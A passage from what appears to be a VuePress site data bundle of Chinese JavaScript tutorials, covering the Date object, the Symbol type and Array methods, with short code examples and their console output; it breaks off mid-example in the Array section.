year代表年份的整数值 month代表月份值（从0-11） day代表一个月中第几天  其余依次分别代表小时，分钟，秒，毫秒\n\n\n\n# Date上的方法\n\n * Date.now() 返回自1970-1-1 00:00:00 UTC (世界标准时间)至今所经过的毫秒数。\n * Date.parse() 解析一个表示日期的字符串，并返回从 1970-1-1 00:00:00 所经过的毫秒数。\n\n\n# 获取日期信息的方法\n\n方法                    含义\ngetDate()             从 Date 对象返回一个月中的某一天 (1 ~ 31)\ngetDay()              从 Date 对象返回一周中的某一天 (0 ~ 6)\ngetMonth()            从 Date 对象返回月份 (0 ~ 11)\ngetFullYear()         从 Date 对象以四位数字返回年份\ngetHours()            返回 Date 对象的小时 (0 ~ 23)\ngetMinutes()          返回 Date 对象的分钟 (0 ~ 59)\ngetSeconds()          返回 Date 对象的秒数 (0 ~ 59)\ngetMilliseconds()     返回 Date 对象的毫秒(0 ~ 999)\ngetTime()             返回 1970 年 1 月 1 日至今的毫秒数\ngetTimezoneOffset()   返回本地时间与格林威治标准时间 (GMT) 的分钟差\n\n\n# 设置日期的方法\n\n方法                     含义\nsetDate()              设置 Date 对象中月的某一天 (1 ~ 31)\nsetMonth()             设置 Date 对象中月份 (0 ~ 11)\nsetFullYear()          设置 Date 对象中的年份（四位数字）\nsetHours()             设置 Date 对象中的小时 (0 ~ 23)\nsetMinutes()           设置 Date 对象中的分钟 (0 ~ 59)\nsetSeconds()           设置 Date 对象中的秒钟 (0 ~ 59)\nsetMilliseconds()      设置 Date 对象中的毫秒 (0 ~ 999)\nsetTime()              以毫秒设置 Date 对象\nsetUTCDate()           根据世界时设置 Date 对象中月份的一天 (1 ~ 31)\nsetUTCMonth()          根据世界时设置 Date 对象中的月份 (0 ~ 11)\nsetUTCFullYear()       根据世界时设置 Date 对象中的年份（四位数字）\nsetUTCHours()          根据世界时设置 Date 对象中的小时 (0 ~ 23)\nsetUTCMinutes()        根据世界时设置 Date 对象中的分钟 (0 ~ 59)\nsetUTCSeconds()        根据世界时设置 Date 对象中的秒钟 (0 ~ 59)\nsetUTCMilliseconds()   根据世界时设置 Date 对象中的毫秒 (0 ~ 999)\n\n\n# 获取时间戳的方法\n\nvar timestamp1 = Date.parse(new Date()); // 结果：1477808630000 不推荐这种办法，毫秒级别的数值被转化为000\n\nvar timestamp2 = (new Date()).valueOf(); // 结果：1477808630404 通过valueOf()函数返回指定对象的原始值获得准确的时间戳值\n\nvar timestamp3 = new Date().getTime(); // 结果：1477808630404 ，通过原型方法直接获得当前时间的毫秒值，准确\n\nvar timetamp4 = Number(new Date()) ; //结果：1477808630404 ,将时间转化为一个number类型的数值，即时间戳\n\nDate.now()           //返回当前时间的时间戳\n\n\n\n# 课堂实例\n\n* 网页动态显示当前时间\n* 倒计时\n* 网页版闹钟的实现\n* 根据日期的不同时间段，做问候语：早上8:00-12:00 :“早上好！欢迎登陆系统” 中午12:00-14:00：“中午好！该休息了” 下午14:00-18:00：“下午好！欢迎登陆系统” 晚上19:00-00:00：“晚上好！XXXXXXXXX”\n* 网页中实现一个计算当年还剩多少时间的倒数计时程序，要求网页上实时动态显示“××年还剩××天××时××分××秒”\n",normalizedContent:"# date对象\n\n> date对象是用来处理日期和时间，date 对象基于1970年1月1日（世界标准时间）起的毫秒数。\n\n\n# 创建日期对象\n\n通过实例化date来创建日期对象，传入参数的形式有以下几种\n\nnew date()   \nnew date(1543299465541);    //参数为时间戳返回时间戳对应的时间对象   (时间戳是从1970年1月1日开始的毫秒数 )\nnew date('december 17, 1996 03:24:00');   //传入日期的字符串形式\nnew date('1995-12-17t03:24:00');      \nnew date(1996, 02, 07);           //传入年月日，不用加引号\nnew date(1996, 02, 07, 3, 24, 0);   //  穿入年，月，日，时，分，秒\n\n\nnew date();           //  不传参数返回当前时间对象 tue nov 27 2018 14:12:40 gmt+0800 (中国标准时间)\nnew date(value);      //参数为时间戳返回时间戳对应的时间对象   (时间戳是从1970年1月1日开始的毫秒数 )\nnew date(datestring);    //表示日期的字符串值。该字符串应该能被 date.parse() 方法识别\nnew date(year, month[, day[, hour[, minutes[, seconds[, milliseconds]]]]]);\n// year代表年份的整数值 month代表月份值（从0-11） day代表一个月中第几天  其余依次分别代表小时，分钟，秒，毫秒\n\n\n\n# date上的方法\n\n * date.now() 返回自1970-1-1 00:00:00 utc (世界标准时间)至今所经过的毫秒数。\n * date.parse() 解析一个表示日期的字符串，并返回从 1970-1-1 00:00:00 所经过的毫秒数。\n\n\n# 获取日期信息的方法\n\n方法                    含义\ngetdate()             从 date 对象返回一个月中的某一天 (1 ~ 31)\ngetday()              从 date 对象返回一周中的某一天 (0 ~ 6)\ngetmonth()            从 date 对象返回月份 (0 ~ 11)\ngetfullyear()         从 date 对象以四位数字返回年份\ngethours()            返回 date 对象的小时 (0 ~ 23)\ngetminutes()          返回 date 对象的分钟 (0 ~ 59)\ngetseconds()          返回 date 对象的秒数 (0 ~ 59)\ngetmilliseconds()     返回 date 对象的毫秒(0 ~ 999)\ngettime()             返回 1970 年 1 月 1 日至今的毫秒数\ngettimezoneoffset()   返回本地时间与格林威治标准时间 (gmt) 的分钟差\n\n\n# 设置日期的方法\n\n方法                     含义\nsetdate()              设置 date 对象中月的某一天 (1 ~ 31)\nsetmonth()             设置 date 对象中月份 (0 ~ 11)\nsetfullyear()          设置 date 对象中的年份（四位数字）\nsethours()             设置 date 对象中的小时 (0 ~ 23)\nsetminutes()           设置 date 对象中的分钟 (0 ~ 59)\nsetseconds()           设置 date 对象中的秒钟 (0 ~ 59)\nsetmilliseconds()      设置 date 对象中的毫秒 (0 ~ 999)\nsettime()              以毫秒设置 date 对象\nsetutcdate()           根据世界时设置 date 对象中月份的一天 (1 ~ 31)\nsetutcmonth()          根据世界时设置 date 对象中的月份 (0 ~ 11)\nsetutcfullyear()       根据世界时设置 date 对象中的年份（四位数字）\nsetutchours()          根据世界时设置 date 对象中的小时 (0 ~ 23)\nsetutcminutes()        根据世界时设置 date 对象中的分钟 (0 ~ 59)\nsetutcseconds()        根据世界时设置 date 对象中的秒钟 (0 ~ 59)\nsetutcmilliseconds()   根据世界时设置 date 对象中的毫秒 (0 ~ 999)\n\n\n# 获取时间戳的方法\n\nvar timestamp1 = date.parse(new date()); // 结果：1477808630000 不推荐这种办法，毫秒级别的数值被转化为000\n\nvar timestamp2 = (new date()).valueof(); // 结果：1477808630404 通过valueof()函数返回指定对象的原始值获得准确的时间戳值\n\nvar timestamp3 = new date().gettime(); // 结果：1477808630404 ，通过原型方法直接获得当前时间的毫秒值，准确\n\nvar timetamp4 = number(new date()) ; //结果：1477808630404 ,将时间转化为一个number类型的数值，即时间戳\n\ndate.now()           //返回当前时间的时间戳\n\n\n\n# 课堂实例\n\n* 网页动态显示当前时间\n* 倒计时\n* 网页版闹钟的实现\n* 根据日期的不同时间段，做问候语：早上8:00-12:00 :“早上好！欢迎登陆系统” 中午12:00-14:00：“中午好！该休息了” 下午14:00-18:00：“下午好！欢迎登陆系统” 晚上19:00-00:00：“晚上好！xxxxxxxxx”\n* 网页中实现一个计算当年还剩多少时间的倒数计时程序，要求网页上实时动态显示“××年还剩××天××时××分××秒”\n",charsets:{cjk:!0}},{title:"Symbol",frontmatter:{},regularPath:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/08-Symbol.html",relativePath:"Javascript/Javascript基础语法/08-Symbol.md",key:"v-3b8aff57",path:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/08-Symbol.html",headers:[{level:2,title:"Symbol函数的参数",slug:"symbol函数的参数",normalizedTitle:"symbol函数的参数",charIndex:161},{level:2,title:"作为属性名的Symbol",slug:"作为属性名的symbol",normalizedTitle:"作为属性名的symbol",charIndex:399},{level:3,title:"Symbol最为属性名遍历",slug:"symbol最为属性名遍历",normalizedTitle:"symbol最为属性名遍历",charIndex:1067},{level:2,title:"Symbol的方法",slug:"symbol的方法",normalizedTitle:"symbol的方法",charIndex:1289},{level:3,title:"Symbol.for()",slug:"symbol-for",normalizedTitle:"symbol.for()",charIndex:1303},{level:3,title:"Symbol.keyFor()",slug:"symbol-keyfor",normalizedTitle:"symbol.keyfor()",charIndex:1987},{level:2,title:"Symbol的应用场景",slug:"symbol的应用场景",normalizedTitle:"symbol的应用场景",charIndex:2171}],headersStr:"Symbol函数的参数 作为属性名的Symbol Symbol最为属性名遍历 Symbol的方法 Symbol.for() Symbol.keyFor() Symbol的应用场景",content:"# Symbol\n\n> ES6引入了一种新的原始数据类型Symbol，表示独一无二的值。Symbol值通过Symbol函数生成。这就是说，对象的属性名现在可以有两种类型，一种是原来就有的字符串，另一种就是新增的Symbol类型。凡是属性名属于Symbol类型，就都是独一无二的，可以保证不会与其他属性名产生冲突。\n\n\n# Symbol函数的参数\n\n> Symbol函数的参数只是表示对当前 Symbol 值的描述，因此相同参数的Symbol函数的返回值是不相等的。\n\n// 没有参数的情况\nvar s1 = Symbol();\nvar s2 = Symbol();\ns1 === s2 // false\n// 有参数的情况\nvar s3 = Symbol('fun');\nvar s4 = Symbol('fun');\ns3 === s4                // false\n\n\n\n# 作为属性名的Symbol\n\n> 每一个Symbol值都是不相等的，所以Symbol值可以作为标识符。\n> 当用于对象的属性名时，可以保证不会出现同名的属性，防止某一个键被不小心改写或覆盖。\n> 对象属性名是Symbol值时，不能用点运算符。\n\nvar mySymbol1 = Symbol()\nvar mySymbol2 = Symbol()\nvar mySymbol3 = Symbol()\nvar a = {}\na[mySymbol1] = 'hello!';\nvar b = {\n   [mySymbol2]:'hello!'\n}\nvar c = {};\nObject.defineProperty(c, mySymbol3, { value: 'hello!'});\nconsole.log(a[mySymbol1]);                 //hello！\nconsole.log(b[mySymbol2]);                 //hello！\nconsole.log(c[mySymbol3]);                 //hello！\n\n\nvar mySymbol = Symbol();\nvar a = {};\na.mySymbol = 'Hello!';\na[mySymbol]                              // undefined\na['mySymbol']                            // \"Hello!\"\n\n\n\n# Symbol最为属性名遍历\n\n 1. 使用Symbol作为属性名时，该属性将不会被 for...in 遍历,不会被Object.keys()、Object.getOwnPropertyNames()、JSON.stringify()返回。\n 2. 使用 Symbol 作为属性名时，该属性可以通过 Object.getOwnPropertySymbols() 方法获取。\n 3. 使用 Symbol 作为属性名时，该属性不是私有属性。\n\n\n# Symbol的方法\n\n\n# Symbol.for()\n\n> 有时，我们希望重新使用同一个Symbol值，Symbol.for方法可以做到这一点。它接受一个字符串作为参数，然后搜索有没有以该参数作为名称的Symbol值。如果有，就返回这个Symbol值，否则就新建并返回一个以该字符串为名称的Symbol值。\n> Symbol.for()与Symbol()这两种写法，都会生成新的Symbol。它们的区别是，前者会被登记在全局环境中供搜索，后者不会。\n\nvar foo = Symbol('foo');\nvar s1 = Symbol.for('foo');\nvar s2 = Symbol.for('foo');\n\nconsole.log(foo);                      //Symbol(foo)\nconsole.log(typeof foo);               //symbol\nconsole.log(s1);                        //Symbol(foo)\nconsole.log(typeof s1);              //symbol\nconsole.log(s2);                     //Symbol(foo)\nconsole.log(typeof s2);             //symbol\nconsole.log(foo === s1);            // false\nconsole.log(s1 === s2);             //true\n\n\n\n# Symbol.keyFor()\n\n> Symbol.keyFor方法返回一个已登记的 Symbol 类型值的key。\n\nvar s1 = Symbol.for(\"foo\");\nSymbol.keyFor(s1)     // \"foo\"\n\nvar s2 = Symbol(\"foo\");\nSymbol.keyFor(s2)     // undefined\n\n\n\n# Symbol的应用场景\n\n 1. 在对象中有很多值，但是循环输出时，并不希望全部输出，那我们就可以使用Symbol进行保护。\n 2. 解决属性名的冲突,因为传入对象属性时,同样的Symbol不相等;\n    解释:什么是冲突呢？当多人合作编码的时候，经常会出现你往对象上加了一个某某属性（比如 $ ），他人正好也想到了这个名称，当你们同时用了这个名称作为属性，代码之间就会发生冲突，互相覆盖。而用 symbol，即使都用了相同的描述，也不是同一个 symbol。\n 3. Symbol值不能与其他类型的值进行运算，会报错。",normalizedContent:"# symbol\n\n> es6引入了一种新的原始数据类型symbol，表示独一无二的值。symbol值通过symbol函数生成。这就是说，对象的属性名现在可以有两种类型，一种是原来就有的字符串，另一种就是新增的symbol类型。凡是属性名属于symbol类型，就都是独一无二的，可以保证不会与其他属性名产生冲突。\n\n\n# symbol函数的参数\n\n> symbol函数的参数只是表示对当前 symbol 值的描述，因此相同参数的symbol函数的返回值是不相等的。\n\n// 没有参数的情况\nvar s1 = symbol();\nvar s2 = symbol();\ns1 === s2 // false\n// 有参数的情况\nvar s3 = symbol('fun');\nvar s4 = symbol('fun');\ns3 === s4                // false\n\n\n\n# 作为属性名的symbol\n\n> 每一个symbol值都是不相等的，所以symbol值可以作为标识符。\n> 当用于对象的属性名时，可以保证不会出现同名的属性，防止某一个键被不小心改写或覆盖。\n> 对象属性名是symbol值时，不能用点运算符。\n\nvar mysymbol1 = symbol()\nvar mysymbol2 = symbol()\nvar mysymbol3 = symbol()\nvar a = {}\na[mysymbol1] = 'hello!';\nvar b = {\n   [mysymbol2]:'hello!'\n}\nvar c = {};\nobject.defineproperty(c, mysymbol3, { value: 'hello!'});\nconsole.log(a[mysymbol1]);                 //hello！\nconsole.log(b[mysymbol2]);                 //hello！\nconsole.log(c[mysymbol3]);                 //hello！\n\n\nvar mysymbol = symbol();\nvar a = {};\na.mysymbol = 'hello!';\na[mysymbol]                              // undefined\na['mysymbol']                            // \"hello!\"\n\n\n\n# symbol最为属性名遍历\n\n 1. 使用symbol作为属性名时，该属性将不会被 for...in 遍历,不会被object.keys()、object.getownpropertynames()、json.stringify()返回。\n 2. 使用 symbol 作为属性名时，该属性可以通过 object.getownpropertysymbols() 方法获取。\n 3. 使用 symbol 作为属性名时，该属性不是私有属性。\n\n\n# symbol的方法\n\n\n# symbol.for()\n\n> 有时，我们希望重新使用同一个symbol值，symbol.for方法可以做到这一点。它接受一个字符串作为参数，然后搜索有没有以该参数作为名称的symbol值。如果有，就返回这个symbol值，否则就新建并返回一个以该字符串为名称的symbol值。\n> symbol.for()与symbol()这两种写法，都会生成新的symbol。它们的区别是，前者会被登记在全局环境中供搜索，后者不会。\n\nvar foo = symbol('foo');\nvar s1 = symbol.for('foo');\nvar s2 = symbol.for('foo');\n\nconsole.log(foo);                      //symbol(foo)\nconsole.log(typeof foo);               //symbol\nconsole.log(s1);                        //symbol(foo)\nconsole.log(typeof s1);              //symbol\nconsole.log(s2);                     //symbol(foo)\nconsole.log(typeof s2);             //symbol\nconsole.log(foo === s1);            // false\nconsole.log(s1 === s2);             //true\n\n\n\n# symbol.keyfor()\n\n> symbol.keyfor方法返回一个已登记的 symbol 类型值的key。\n\nvar s1 = symbol.for(\"foo\");\nsymbol.keyfor(s1)     // \"foo\"\n\nvar s2 = symbol(\"foo\");\nsymbol.keyfor(s2)     // undefined\n\n\n\n# symbol的应用场景\n\n 1. 在对象中有很多值，但是循环输出时，并不希望全部输出，那我们就可以使用symbol进行保护。\n 2. 解决属性名的冲突,因为传入对象属性时,同样的symbol不相等;\n    解释:什么是冲突呢？当多人合作编码的时候，经常会出现你往对象上加了一个某某属性（比如 $ ），他人正好也想到了这个名称，当你们同时用了这个名称作为属性，代码之间就会发生冲突，互相覆盖。而用 symbol，即使都用了相同的描述，也不是同一个 symbol。\n 3. symbol值不能与其他类型的值进行运算，会报错。",charsets:{cjk:!0}},{title:"数组方法和属性",frontmatter:{},regularPath:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/07-%E5%AF%B9%E8%B1%A1/08-Array%E5%AF%B9%E8%B1%A1.html",relativePath:"Javascript/Javascript基础语法/07-对象/08-Array对象.md",key:"v-741db942",path:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/07-%E5%AF%B9%E8%B1%A1/08-Array%E5%AF%B9%E8%B1%A1.html",headers:[{level:2,title:"属性",slug:"属性",normalizedTitle:"属性",charIndex:7},{level:2,title:"方法",slug:"方法",normalizedTitle:"方法",charIndex:4},{level:3,title:"1. arr.push(); 向数组的末尾追加元素",slug:"_1-arr-push-向数组的末尾追加元素",normalizedTitle:"1. arr.push(); 向数组的末尾追加元素",charIndex:99},{level:3,title:"2. arr.unshift(); 向数组的开头添加函数",slug:"_2-arr-unshift-向数组的开头添加函数",normalizedTitle:"2. arr.unshift(); 向数组的开头添加函数",charIndex:252},{level:3,title:"3. arr.pop();   删除末尾的元素",slug:"_3-arr-pop-删除末尾的元素",normalizedTitle:"3. arr.pop();   删除末尾的元素",charIndex:null},{level:3,title:"4. arr.shift();  开头删除一个元素",slug:"_4-arr-shift-开头删除一个元素",normalizedTitle:"4. arr.shift();  开头删除一个元素",charIndex:null},{level:3,title:"5. arr.splice(位置，删除元素的个数，要追加的元素);   任意位置添加删除",slug:"_5-arr-splice-位置-删除元素的个数-要追加的元素-任意位置添加删除",normalizedTitle:"5. arr.splice(位置，删除元素的个数，要追加的元素);   任意位置添加删除",charIndex:null},{level:3,title:'6. arr.join("分隔符") 使用分隔符将数组数据隔开变为字符串',slug:"_6-arr-join-分隔符-使用分隔符将数组数据隔开变为字符串",normalizedTitle:"6. arr.join(&quot;分隔符&quot;) 使用分隔符将数组数据隔开变为字符串",charIndex:null},{level:3,title:"7. arr.slice(截取的起始下标,结束下标) 数组的截取",slug:"_7-arr-slice-截取的起始下标-结束下标-数组的截取",normalizedTitle:"7. arr.slice(截取的起始下标,结束下标) 数组的截取",charIndex:622},{level:3,title:"8. arr.concat 多个数组的连接",slug:"_8-arr-concat-多个数组的连接",normalizedTitle:"8. arr.concat 多个数组的连接",charIndex:740},{level:3,title:"9. arr.indexOf(值);   查找某个值在数组中第一次出现的下标",slug:"_9-arr-indexof-值-查找某个值在数组中第一次出现的下标",normalizedTitle:"9. arr.indexof(值);   查找某个值在数组中第一次出现的下标",charIndex:null},{level:3,title:"10. arr.lastIndexOf(值);   倒叙查找某个值在数组中第一次出现的位置",slug:"_10-arr-lastindexof-值-倒叙查找某个值在数组中第一次出现的位置",normalizedTitle:"10. arr.lastindexof(值);   倒叙查找某个值在数组中第一次出现的位置",charIndex:null},{level:3,title:"11. arr.sort()     数组的排序",slug:"_11-arr-sort-数组的排序",normalizedTitle:"11. arr.sort()     数组的排序",charIndex:null},{level:3,title:"12. arr.forEach()   遍历数组",slug:"_12-arr-foreach-遍历数组",normalizedTitle:"12. arr.foreach()   遍历数组",charIndex:null},{level:3,title:"13. arr.filter()    过滤（根据条件筛选数组元素）",slug:"_13-arr-filter-过滤-根据条件筛选数组元素",normalizedTitle:"13. arr.filter()    过滤（根据条件筛选数组元素）",charIndex:null},{level:3,title:"14. arr.map()   映射 将数组中的所有数据按照条件改变，形成新数组",slug:"_14-arr-map-映射-将数组中的所有数据按照条件改变-形成新数组",normalizedTitle:"14. arr.map()   映射 将数组中的所有数据按照条件改变，形成新数组",charIndex:null},{level:3,title:"15. arr.some()    判断  根据回调函数的判断条件来选择真假",slug:"_15-arr-some-判断-根据回调函数的判断条件来选择真假",normalizedTitle:"15. arr.some()    判断  根据回调函数的判断条件来选择真假",charIndex:null},{level:3,title:"16. arr.every()    判断   根据回调函数的判断条件来选择真假(与some比较记忆)",slug:"_16-arr-every-判断-根据回调函数的判断条件来选择真假-与some比较记忆",normalizedTitle:"16. arr.every()    判断   根据回调函数的判断条件来选择真假(与some比较记忆)",charIndex:null},{level:3,title:"17. arr.reverse() 数组倒序",slug:"_17-arr-reverse-数组倒序",normalizedTitle:"17. arr.reverse() 数组倒序",charIndex:3840},{level:3,title:"18. arr.includes()",slug:"_18-arr-includes",normalizedTitle:"18. arr.includes()",charIndex:4048},{level:3,title:"19. arr.copyWithin() 将指定位置的成员复制到其他位置",slug:"_19-arr-copywithin-将指定位置的成员复制到其他位置",normalizedTitle:"19. arr.copywithin() 将指定位置的成员复制到其他位置",charIndex:4594},{level:3,title:"20. arr.find() 和 findIndex()",slug:"_20-arr-find-和-findindex",normalizedTitle:"20. arr.find() 和 findindex()",charIndex:4923},{level:3,title:"21. arr.fill() 方法使用给定值，填充一个数组。",slug:"_21-arr-fill-方法使用给定值-填充一个数组。",normalizedTitle:"21. arr.fill() 方法使用给定值，填充一个数组。",charIndex:5348},{level:3,title:"22. arr.entries(),keys() 和 values()",slug:"_22-arr-entries-keys-和-values",normalizedTitle:"22. arr.entries(),keys() 和 values()",charIndex:5568},{level:3,title:"23. arr.flat(),flatMap()",slug:"_23-arr-flat-flatmap",normalizedTitle:"23. arr.flat(),flatmap()",charIndex:6244},{level:2,title:"空位处理",slug:"空位处理",normalizedTitle:"空位处理",charIndex:7753},{level:2,title:"数组乱序",slug:"数组乱序",normalizedTitle:"数组乱序",charIndex:9174}],headersStr:'属性 方法 1. arr.push(); 向数组的末尾追加元素 2. arr.unshift(); 向数组的开头添加函数 3. arr.pop();   删除末尾的元素 4. arr.shift();  开头删除一个元素 5. arr.splice(位置，删除元素的个数，要追加的元素);   任意位置添加删除 6. arr.join("分隔符") 使用分隔符将数组数据隔开变为字符串 7. arr.slice(截取的起始下标,结束下标) 数组的截取 8. arr.concat 多个数组的连接 9. arr.indexOf(值);   查找某个值在数组中第一次出现的下标 10. arr.lastIndexOf(值);   倒叙查找某个值在数组中第一次出现的位置 11. arr.sort()     数组的排序 12. arr.forEach()   遍历数组 13. arr.filter()    过滤（根据条件筛选数组元素） 14. arr.map()   映射 将数组中的所有数据按照条件改变，形成新数组 15. arr.some()    判断  根据回调函数的判断条件来选择真假 16. arr.every()    判断   根据回调函数的判断条件来选择真假(与some比较记忆) 17. arr.reverse() 数组倒序 18. arr.includes() 19. arr.copyWithin() 将指定位置的成员复制到其他位置 20. arr.find() 和 findIndex() 21. arr.fill() 方法使用给定值，填充一个数组。 22. arr.entries(),keys() 和 values() 23. arr.flat(),flatMap() 空位处理 数组乱序',content:"# 数组方法和属性\n\n\n# 属性\n\n 1. length: 数组中元素的个数\n 2. constructor: 返回对创建此对象的数组函数的引用（可以用来判断变量是否为数组）\n\n\n# 方法\n\n\n# 1. arr.push(); 向数组的末尾追加元素\n\n- 会修改原数组\n- 返回值：修改后的length值\n- 可以追加多个\n\n\n    arr[1, 2, 3];\n    arr1[4, 5, 6];\n    arr2[...arr, ...arr1]; //  ...扩展运算符，将数组展开\n\n\n\n# 2. arr.unshift(); 向数组的开头添加函数\n\n- 会修改原数组\n- 返回值：修改后的length值\n- 可以追加多个\n\n\n\n# 3. arr.pop(); 删除末尾的元素\n\n- 会修改原数组\n- 返回值：被删除的数据\n- 只能删除一个\n\n\n\n# 4. arr.shift(); 开头删除一个元素\n\n- 会修改原数组\n- 返回值：被删除的数据\n- 只能删除一个\n\n\n\n# 5. arr.splice(位置，删除元素的个数，要追加的元素); 任意位置添加删除\n\n- 添加或者删除包含对应下标\n- 添加数据时：删除元素的个数写0；\n- 可以同时删除和添加（先删除，后添加）\n- 修改原数组\n\n\n\n# 6. arr.join(\"分隔符\") 使用分隔符将数组数据隔开变为字符串\n\n- 不修改原数组\n- 返回值是分隔好的字符串\n\n\n\n# 7. arr.slice(截取的起始下标,结束下标) 数组的截取\n\n- 截取时，包含起始下标，不包含结束下标\n- 不修改原数组\n- 返回值是截取到的数组\n- 参数可以是负数，负数表示倒数，只传一个参数表示从起始下标截取到最后\n\n\n\n# 8. arr.concat 多个数组的连接\n\n- 不修改原数组\n- 返回值是连接之后的新数组       \n\n\n    var arr1 = [1, 2, 3];\n    var arr2 = [4, 5, 6];\n    console.log(arr1.concat(arr2, [7, 8, 9]));\n\n    // 控制台输出\n    // (9) [1, 2, 3, 4, 5, 6, 7, 8, 9]\n\n\n\n# 9. arr.indexOf(值); 查找某个值在数组中第一次出现的下标\n\n- 返回值是数据的下标，没有找到则返回-1\n\n\n    var arr = [1, 5, 6, 99, 52, 663, 22, 66, 552, 123, 6, 622];\n    console.log(arr.indexOf(22)); //查找22在arr数组中的位置\n\n    // 控制台输出\n    // 6\n\n\n\n# 10. arr.lastIndexOf(值); 倒叙查找某个值在数组中第一次出现的位置\n\n\n# 11. arr.sort() 数组的排序\n\n- 如果没有参数，则从字符的编码开始按顺序排\n- 如果有参数，这个参数必须是一个函数（回调函数）这个回调函数有两个参数，分别是a，b\n- 修改原数组\n- 返回值是排序之后的数组                \n\n\n    var arr3 = [1, 5, 6, 99, 52, 663, 22, 66, 552, 6, 622];\n    arr3.sort(function(a, b) {\n        //a-b 正序，\n        //b-a 倒序，  \n        return a - b;\n    })\n    console.log(arr3);\n    // 控制台输出\n    // (11) [1, 5, 6, 6, 22, 52, 66, 99, 552, 622, 663]\n    //箭头函数\n    arr.sort((a, b) => a - b) //正序，\n    arr.sort((a, b) => b - a) //倒序，\n\n\n\n# 12. arr.forEach() 遍历数组\n\n- 接收一个回调函数，回调函数第一个参数是 数组值\n- 第二个参数是 下标\n\n\n    var arr3 = [1, 5, 6, 99, 52, 663, 22, 66, 552, 6, 622];\n    arr3.forEach(function(value, index) {\n        console.log(index, value)\n    })\n    // 箭头函数\n    arr3.forEach((value, index) => {\n        console.log(index, value)\n    })\n\n\n\n# 13. arr.filter() 过滤（根据条件筛选数组元素）\n\n- 根据回调函数的返回值进行元素筛选\n    * 返回值是true，该元素会保留\n    * 返回值是false，该元素跳过\n- 不修改原数组\n- 返回值是筛选之后的数组\n\n\n    var arr = [1, 5, 6, 99, 52, 663, 22, 66, 552, 123, 6, 622];\n    var newArr = arr.filter(function(value, index) {\n        return value > 100; //筛选arr数组中值大于100的元素；\n    })\n    console.log(newArr);\n    // 控制台输出\n    // (4) [663, 552, 123, 622]\n\n\n    var person = [{\n            name: \"张三\",\n            age: 20,\n            sex: \"男\"\n        },\n        {\n            name: \"李四\",\n            age: 19,\n            sex: \"女\"\n        },\n        {\n            name: \"王五\",\n            age: 22,\n            sex: \"男\"\n        },\n        {\n            name: \"赵六\",\n            age: 21,\n            sex: \"女\"\n        }\n    ];\n    var x = person.filter(function(value, index) {\n        return value.age > 20; // 筛选出年龄大于20岁的学生\n        // return value.sex==\"男\";     //筛选出男同学\n    })\n    console.log(x);\n    // 箭头函数\n    arr.filter((value, index) => {\n        return 判断条件\n    })\n\n\n\n# 14. arr.map() 映射 将数组中的所有数据按照条件改变，形成新数组\n\n- 将回调函数每次的返回值，组成一个新的数组\n- 返回值是映射改变之后的数组\n- 不修改原数组\n\n\n    var arr = [1, 5, 6, 99, 52, 663, 22, 66, 552, 123, 6, 622];\n    // var end=arr3.map(function(value,index){\n    // \treturn value*2;        //将数组中的所有元素都乘以2返回\n    // });\n    // 箭头函数\n    var end = arr.map((value, index) => value * 2);\n    console.log(end);\n\n\n\n# 15. arr.some() 判断 根据回调函数的判断条件来选择真假\n\n- 只要有一个回调函数返回值是true，最终some结果是true；\n\n\n    var arr3 = [1, 5, 6, 99, 52, 663, 22, 66, 552, 123, 6, 622];\n    var end = arr3.some(function(value, index) {\n        return value < 500;\n    });\n    console.log(end); //true\n\n\n\n# 16. arr.every() 判断 根据回调函数的判断条件来选择真假(与some比较记忆)\n\n- 只要有一个回调函数返回值是false，最终every结果是false；\n\n\n    var arr3 = [1, 5, 6, 99, 52, 663, 22, 66, 552, 123, 6, 622];\n    var end = arr3.every(function(value, index) {\n        return value < 500;\n    });\n    console.log(end); //false\n\n\n\n# 17. arr.reverse() 数组倒序\n\n- 返回修改后的数组\n- 改变原数组\n\n\n    var arr = [1, 5, 8, 6, 9, 4, 2, 3];\n    console.log(arr.reverse()); // (8) [3, 2, 4, 9, 6, 8, 5, 1]\n    console.log(arr); // (8) [3, 2, 4, 9, 6, 8, 5, 1]\n\n\n\n# 18. arr.includes()\n\n- 用于检查数组是否包含某元素，包含返回true，否则返回false\n- 无法检测对象是否存在\n- 假如只想知道某个值是否在数组中而并不关心它的索引位置，建议使用 `includes()` 。如果想获取一个值在数组中的位置，那么你只能使用 `indexOf` 方法。并且 `includes()` 可以识别NaN\n\n\n    var arr = [1, 2, {\n        name: \"张三\"\n    }]\n    arr.includes(2) // true\n    arr.includes(4) // false\n    arr.includes({\n        name: \"张三\"\n    }) // false\n\n\n- 可接收俩个参数：**要搜索的值, 搜索的开始索引**\n\n\n    ['a', 'b', 'c', 'd'].includes('b') // true\n    ['a', 'b', 'c', 'd'].includes('b', 1) // true\n    ['a', 'b', 'c', 'd'].includes('b', 2) // false\n\n\n- 此方法为 ES7新增，兼容性\n\n\n\n\n\n# 19. arr.copyWithin() 将指定位置的成员复制到其他位置\n\nArray.prototype.copyWithin(target, start = 0, end = this.length)\n\n * target（必需）：从该位置开始替换数据。如果为负值，表示倒数。\n * start（可选）：从该位置开始读取数据，默认为 0。如果为负值，表示从末尾开始计算。\n * end（可选）：到该位置前停止读取数据，默认等于数组长度。如果为负值，表示从末尾开始计算\n\n这三个参数都应该是数值，如果不是，会自动转为数值。\n\n// 将3号位复制到0号位\n[1, 2, 3, 4, 5].copyWithin(0, 3, 4)\n\n\n * 改变原数组\n\n\n# 20. arr.find() 和 findIndex()\n\n> 数组实例的find方法，用于找出第一个符合条件的数组成员。它的参数是一个回调函数，所有数组成员依次执行该回调函数，直到找出第一个返回值为true的成员，然后返回该成员。如果没有符合条件的成员，则返回undefined。\n\n[1, 4, -5, 10].find((n) => n < 0)\n// -5\n\n[1, 5, 10, 15].find(function(value, index, arr) {\n  return value > 9;\n}) // 10\n\n\n> 数组实例的findIndex方法的用法与find方法非常类似，返回第一个符合条件的数组成员的位置，如果所有成员都不符合条件，则返回-1。\n\n[1, 5, 10, 15].findIndex(function(value, index, arr) {\n  return value > 9;\n}) // 2\n\n\n\n# 21. arr.fill() 方法使用给定值，填充一个数组。\n\n * 原数组填充指定值\n * 改变原数组\n\n['a', 'b', 'c'].fill(7)\n// [7, 7, 7]\n\nnew Array(3).fill(7)\n// [7, 7, 